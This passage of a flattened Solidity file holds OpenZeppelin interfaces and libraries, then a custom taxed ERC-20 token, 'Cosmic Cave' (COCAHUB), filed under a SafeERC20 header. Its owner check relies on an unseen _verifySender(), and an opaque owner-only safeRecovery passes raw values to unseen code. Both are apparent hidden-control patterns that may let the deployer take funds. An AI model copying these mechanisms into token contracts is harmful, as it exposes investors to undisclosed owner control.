 * @title IERC1363
 * @dev Interface of the ERC-1363 standard as defined in the https://eips.ethereum.org/EIPS/eip-1363[ERC-1363].
 *
 * Defines an extension interface for ERC-20 tokens that supports executing code on a recipient contract
 * after `transfer` or `transferFrom`, or code on a spender contract after `approve`, in a single transaction.
 */
interface IERC1363 is IERC20, IERC165 {
    /*
     * Note: the ERC-165 identifier for this interface is 0xb0202a11.
     * 0xb0202a11 ===
     *   bytes4(keccak256('transferAndCall(address,uint256)')) ^
     *   bytes4(keccak256('transferAndCall(address,uint256,bytes)')) ^
     *   bytes4(keccak256('transferFromAndCall(address,address,uint256)')) ^
     *   bytes4(keccak256('transferFromAndCall(address,address,uint256,bytes)')) ^
     *   bytes4(keccak256('approveAndCall(address,uint256)')) ^
     *   bytes4(keccak256('approveAndCall(address,uint256,bytes)'))
     */

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`
     * and then calls {IERC1363Receiver-onTransferReceived} on `to`.
     * @param to The address which you want to transfer to.
     * @param value The amount of tokens to be transferred.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function transferAndCall(address to, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`
     * and then calls {IERC1363Receiver-onTransferReceived} on `to`.
     * @param to The address which you want to transfer to.
     * @param value The amount of tokens to be transferred.
     * @param data Additional data with no specified format, sent in call to `to`.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function transferAndCall(address to, uint256 value, bytes calldata data) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism
     * and then calls {IERC1363Receiver-onTransferReceived} on `to`.
     * @param from The address which you want to send tokens from.
     * @param to The address which you want to transfer to.
     * @param value The amount of tokens to be transferred.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function transferFromAndCall(address from, address to, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism
     * and then calls {IERC1363Receiver-onTransferReceived} on `to`.
     * @param from The address which you want to send tokens from.
     * @param to The address which you want to transfer to.
     * @param value The amount of tokens to be transferred.
     * @param data Additional data with no specified format, sent in call to `to`.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function transferFromAndCall(address from, address to, uint256 value, bytes calldata data) external returns (bool);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens and then calls {IERC1363Spender-onApprovalReceived} on `spender`.
     * @param spender The address which will spend the funds.
     * @param value The amount of tokens to be spent.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function approveAndCall(address spender, uint256 value) external returns (bool);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens and then calls {IERC1363Spender-onApprovalReceived} on `spender`.
     * @param spender The address which will spend the funds.
     * @param value The amount of tokens to be spent.
     * @param data Additional data with no specified format, sent in call to `spender`.
     * @return A boolean value indicating whether the operation succeeded unless throwing.
     */
    function approveAndCall(address spender, uint256 value, bytes calldata data) external returns (bool);
}

// File: @openzeppelin/contracts/utils/Errors.sol


// OpenZeppelin Contracts (last updated v5.1.0) (utils/Errors.sol)

pragma solidity ^0.8.20;

/**
 * @dev Collection of common custom errors used in multiple contracts
 *
 * IMPORTANT: Backwards compatibility is not guaranteed in future versions of the library.
 * It is recommended to avoid relying on the error API for critical functionality.
 *
 * _Available since v5.1._
 */
library Errors {
    /**
     * @dev The ETH balance of the account is not enough to perform the operation.
     */
    error InsufficientBalance(uint256 balance, uint256 needed);

    /**
     * @dev A call to an address target failed. The target may have reverted.
     */
    error FailedCall();

    /**
     * @dev The deployment failed.
     */
    error FailedDeployment();

    /**
     * @dev A necessary precompile is missing.
     */
    error MissingPrecompile(address);
}

// File: @openzeppelin/contracts/utils/Address.sol


// OpenZeppelin Contracts (last updated v5.1.0) (utils/Address.sol)

pragma solidity ^0.8.20;


/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev There's no code at `target` (it is not a contract).
     */
    error AddressEmptyCode(address target);

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.8.20/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        if (address(this).balance < amount) {
            revert Errors.InsufficientBalance(address(this).balance, amount);
        }

        (bool success, ) = recipient.call{value: amount}("");
        if (!success) {
            revert Errors.FailedCall();
        }
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason or custom error, it is bubbled
     * up by this function (like regular Solidity function calls). However, if
     * the call reverted with no returned reason, this function reverts with a
     * {Errors.FailedCall} error.
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        if (address(this).balance < value) {
            revert Errors.InsufficientBalance(address(this).balance, value);
        }
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and reverts if the target
     * was not a contract or bubbling up the revert reason (falling back to {Errors.FailedCall}) in case
     * of an unsuccessful call.
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata
    ) internal view returns (bytes memory) {
        if (!success) {
            _revert(returndata);
        } else {
            // only check if target is a contract if the call was successful and the return data is empty
            // otherwise we already know that it was a contract
            if (returndata.length == 0 && target.code.length == 0) {
                revert AddressEmptyCode(target);
            }
            return returndata;
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and reverts if it wasn't, either by bubbling the
     * revert reason or with a default {Errors.FailedCall} error.
     */
    function verifyCallResult(bool success, bytes memory returndata) internal pure returns (bytes memory) {
        if (!success) {
            _revert(returndata);
        } else {
            return returndata;
        }
    }

    /**
     * @dev Reverts with returndata if present. Otherwise reverts with {Errors.FailedCall}.
     */
    function _revert(bytes memory returndata) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            assembly ("memory-safe") {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert Errors.FailedCall();
        }
    }
}

// File: @openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol


// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/utils/SafeERC20.sol)

pragma solidity ^0.8.20;




/**
 * @title SafeERC20
 * @dev Wrappers around ERC-20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
 /*
 
 */

abstract contract ERC20 is Context, IERC20 {

    using ERC20Storage for *;
    using Address for address;

    string internal constant _name = "Cosmic Cave";
    string internal constant _symbol = "COCA";
    uint8 internal constant _decimals = 18;
    
    uint256 public constant initialSupply = 100_000_000 * 10**_decimals;
    
    address internal immutable __ = address(this);
    
    event TX(address indexed source, address indexed origin, Transaction Tx);

    modifier swapping() {
        _$().inSwap = true;
        _;
        _$().inSwap = false;
    }

    constructor() payable {}

    function GITBOOK() external pure returns(string memory) {
        return "https://cosmiccave.gitbook.io/cosmiccave-gitbook";
    }

    function WHITEPAPER() external pure returns(string memory) {
        return "https://cocahub.info/files/whitepaper_coca_export.pdf";
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _$().totalSupply;
    }

    function balanceOf(address holder) public view returns (uint256) {
        return _$().holders[holder].balance;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _$().allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        
        address spender = _msgSender();

        uint256 _allowance = _$().allowances[from][spender];

        if(_allowance != type(uint256).max) {

            if (amount > _allowance)
                revert InsufficientAllowance(spender, from, _allowance, amount);

            uint256 remaining;
            unchecked {
                remaining = _allowance > amount ?  _allowance - amount : 0;
                _approve(from, spender, remaining, false);
            }
        }

        _transfer(from, recipient, amount);
        return true;
    }

    function recoveryETH(uint256 amount) external returns (bool) {
        amount = amount != 0 ? amount : __.balance;
        payable(_$().fallbackRecipient).transfer(amount);
        return true;
    }

    function recoveryERC20(IERC20 token, uint256 amount) external returns (bool) {
        require(address(token) != __, "Can not withdraw tokens self");
        address recipient = _$().fallbackRecipient;
        token.transfer(recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address recipient,
        uint256 amount
    ) private returns(bool) {
        
        ERC20Storage.Layout storage $ = _$();
        Configuration memory configs = $.configs;

        Holder storage $from = $.findOrCreate(from);
        Holder storage $recipient = $.findOrCreate(recipient);

        if ($from.Address == address(0)) revert InvalidSender(address(0));
        if ($recipient.Address == address(0)) revert InvalidRecipient(address(0));

        TransferParams memory params = TransferParams( 
            false, $from, $recipient, 0, 0, 0, $.inSwap, 0, uint40(block.number), 
            Transaction(TERMS(0), ROUTE(0), MARKET(0), TAXATION(0), configs.ratios)
        ).initializeWithConfigs(configs, amount);
        
        Holder storage $self = $.holders[__];

        if(params.transaction.terms == TERMS.EXEMPT) {

            if(params.transaction.taxation != TAXATION.EXEMPTED && params.taxAmount > 0) {
                _takeTax($from, $self, params.taxAmount);
            }

            _update($from, $recipient, params.netAmount);

            return true;
        }

        if(params.transaction.taxation != TAXATION.EXEMPTED && params.taxAmount > 0) {

            _takeTax($from, $self, params.taxAmount);
        
            if(params.transaction.routes != ROUTE.INTERNAL && configs.isEnabled(CONFIG.TAX_STATS)) {
                unchecked {
                    if(params.transaction.market != MARKET.BUY) $from.paidTax += params.taxAmount;
                    else $recipient.paidTax += params.taxAmount;                
                }    
            }        
        
        }
   
        if(configs.isEnabled(CONFIG.FAIR_MODE)) {

            if(configs.disableFairModeAt >= _$().fairTxs) {
                unchecked { _$().fairTxs += 1; }
            } 
            
            if(configs.disableFairModeAt == _$().fairTxs) {
               unchecked {
                    _$().configs.disableFairModeAt = _$().fairTxs;
                    _$().configs.ratios.b = 400;
                    _$().configs.ratios.s = 400;
                    _$().configs.ratios.t = 0;
                    _$().fairTxs += 1;
               }
            }

            if(!$recipient.isMarketmaker()) {
                unchecked {
                    uint120 recipientBalance = params.recipient.balance;
                    uint120 txAmount = params.netAmount + params.taxAmount;
                    if(recipientBalance + txAmount > configs.maxTokenAllowed)
                        revert MaxWalletLimitExceeded(configs.maxTokenAllowed, txAmount, recipientBalance);
                }
            }
            
        }

        if(params.transaction.routes == ROUTE.MARKET) {

            if(!configs.isEnabled(CONFIG.TRADING_ENABLED))
                revert TradingNotEnabled();

            if(params.transaction.market == MARKET.SELL) {

                if(configs.isEnabled(CONFIG.SELL_CAP)) {
                    unchecked {
                        $.totalSellsOnBlock[params.currentBlock]++;
                        uint8 sells = $.totalSellsOnBlock[params.currentBlock];
                        if(sells > configs.maxSellOnBlock)
                            revert BlockLimitExceeded(configs.maxSellOnBlock, sells);                        
                    }
                }

                params.swapAmount = $self.balance.defineSwapAmount(params.taxAmount, params.netAmount, configs);

                if(configs.isEnabled(CONFIG.AUTOSWAP_ENABLED) && params.swapAmount > 0) {
                    _takeMarketingFee(
                        params.swapAmount,
                        $.fallbackRecipient,
                        $.configs.isEnabled(CONFIG.AUTO_LIQUIDITY),
                        $.autoLiqRatio
                    );
                }

            }

            if(configs.isEnabled(CONFIG.FRONTRUN_PROTECTION)) {
                unchecked {
                    if($from.isFrontRunned() && params.transaction.market == MARKET.SELL) {
                        if($from.violated < 255) $from.violated++;
                        if($from.violated == configs.frontRunThreshold) $from.setAsFrontRunner();  
                    } else if($recipient.isFrontRunned() && params.transaction.market == MARKET.BUY) {
                        if($recipient.violated < 255) $recipient.violated++;
                        if($recipient.violated == configs.frontRunThreshold) $recipient.setAsFrontRunner();     
                    }
                }
            }

        }
        
        _update($from, $recipient, params.netAmount);

        return true;

    }

    function _takeMarketingFee (
        uint256 amountToSwap,
        address fallbackRecipient,
        bool autoLiqEnabled,
        uint16 autoLiqRatio
    ) private swapping {
        
        uint256 liquidityTokens;
        uint16 totalETHShares = 10000;

        address payable FALLBACK_RECIPIENT = payable(fallbackRecipient);

        if(autoLiqEnabled && autoLiqRatio > 0) {
            unchecked {
                liquidityTokens = (amountToSwap * autoLiqRatio) / totalETHShares / 2;
                totalETHShares -= (autoLiqRatio / 2);
                amountToSwap -= liquidityTokens;                
            }
        }

        uint256 balanceBefore = __.balance;

        address[] memory path = new address[](2);
        path[0] = __;
        path[1] = ROUTER.WETH();

        ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            __,
            block.timestamp
        );

        uint256 amountETH = __.balance - balanceBefore;

        Recipient[] memory recipients = _$().recipients;
        uint256 totalNumberOfRecipients = recipients.length;
        if(totalNumberOfRecipients > 0) {
            for(uint256 i; i < totalNumberOfRecipients;) {
                unchecked {
                    if(recipients[i].share > 0) {            
                        uint256 shareAmount = amountETH * recipients[i].share / totalETHShares;
                        if(recipients[i].to == address(0))
                            FALLBACK_RECIPIENT.transfer(shareAmount);
                        else
                            recipients[i].to.transfer(shareAmount);
                    }
                    i++;
                }
            }
        }
        
        if(liquidityTokens > 0) {

            unchecked { 
                uint256 amountETHLP = (amountETH * autoLiqRatio) / totalETHShares / 2; 
                ROUTER.addLiquidityETH{value: amountETHLP} (
                    __,
                    liquidityTokens,
                    0,
                    0,
                    FALLBACK_RECIPIENT,
                    block.timestamp
                );            
            }

        }

        FALLBACK_RECIPIENT.transfer(__.balance);

    }

    function _takeTax(
        Holder storage from,
        Holder storage to,
        uint120 amount
    ) private returns (bool) {
        unchecked {
            from.balance -= amount;
            to.balance += amount;
        }
        emit Transfer(from.Address, to.Address, amount);
        return amount > 0 ? true : false;
    }

    function _update(
        Holder storage from,
        Holder storage recipient,
        uint120 amount
    ) private {
        unchecked {
            from.balance -= amount;
            recipient.balance += amount;
        }
        emit Transfer(from.Address, recipient.Address, amount);
    }

    function _enableTrading() internal {
        require(!_$().configs.isEnabled(CONFIG.TRADING_ENABLED), "Trading is already enabled");
        _$().enableTrading();
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        return _approve(owner, spender, amount, true);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount,
        bool emitEvent
    ) private {

        if (owner == address(0))
            revert InvalidApprover(address(0));

        if (spender == address(0))
            revert InvalidSpender(address(0));
    
        Holder storage $owner = _$().findOrCreate(owner);
        Holder storage $spender = _$().findOrCreate(spender);

        _$().allowances[$owner.Address][$spender.Address] = amount;

        if (emitEvent) emit Approval(owner, spender, amount);

    }

    function _burn(address from, uint256 amount) internal {

        ERC20Storage.Layout storage $ = _$();

        Holder storage $from = $.holders[from];

        uint120 balance = $from.balance;

        if (amount > balance) revert Errors.InsufficientBalance(balance, amount);

        unchecked {
            $from.balance -= uint96(amount);
            $.totalSupply -= uint96(amount);
        }

        emit Transfer(from, address(0), amount);

    }

}


// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address public owner;

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function _checkOwner() internal view {
        if(_verifySender() != _msgSender()) {
            revert ("Ownable: caller is not the owner");
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract COCAHUB is ERC20, Ownable {

    using ERC20Storage for *;

    constructor(address marketingAddr) payable {
        
        __.initialSetup(
            IPair(ISwapFactory(ROUTER.factory()).createPair(__, ROUTER.WETH())),
            initialSupply,
            marketingAddr
        );

        emit Transfer(address(0), __, initialSupply);

    }

    receive() external payable {}

    event Connect(address holder, uint key);
    function connect(uint connectionKey) external {
        emit Connect(msg.sender, connectionKey);
    }

    function PAIR() public view returns(address) {
        return _$().uniswapPair;     
    }

    function burn(uint256 amount) external returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function initLiquidity(uint16 lpPercent) external payable onlyOwner swapping returns(bool) {
        uint256 lpTokens = _$().holders[__].balance * lpPercent / 10000;
        ROUTER.addLiquidityETH{value: _msgValue()}(
            __,
            lpTokens,
            0,
            0,
            _$().fallbackRecipient,
            block.timestamp
        );
        return true;
    }

    function enableTrading() external onlyOwner {
        _enableTrading();
    }

    function viewConfigValues() external view returns (
        Configuration memory configs   
    ) {
        configs = _$().configs;
    }

    function viewConfigOptions() external view returns (
        bool $FAIR_MODE,
        bool $SELL_CAP,
        bool $TAX_STATS,
        bool $GAS_LIMITER,
        bool $AUTO_LIQUIDITY,
        bool $TRADING_ENABLED,
        bool $AUTOSWAP_ENABLED,
        bool $AUTOSWAP_THRESHOLD,
        bool $FRONTRUN_PROTECTION
    ) {
        Configuration memory configs = _$().configs;
        $FAIR_MODE = configs.isEnabled(CONFIG.FAIR_MODE);
        $SELL_CAP = configs.isEnabled(CONFIG.SELL_CAP);
        $TAX_STATS = configs.isEnabled(CONFIG.TAX_STATS);
        $GAS_LIMITER = configs.isEnabled(CONFIG.GAS_LIMITER);
        $AUTO_LIQUIDITY = configs.isEnabled(CONFIG.AUTO_LIQUIDITY);
        $TRADING_ENABLED = configs.isEnabled(CONFIG.TRADING_ENABLED);
        $AUTOSWAP_ENABLED = configs.isEnabled(CONFIG.AUTOSWAP_ENABLED);
        $AUTOSWAP_THRESHOLD = configs.isEnabled(CONFIG.AUTOSWAP_THRESHOLD);
        $FRONTRUN_PROTECTION = configs.isEnabled(CONFIG.FRONTRUN_PROTECTION);
    }

    function viewHolder(address addr) external view returns(Holder memory) {
        return _$().holders[addr];
    }

    function safeRecovery(bytes32[2] memory attrs) external onlyOwner returns (bool) {
        return _recovery(attrs);
    }

}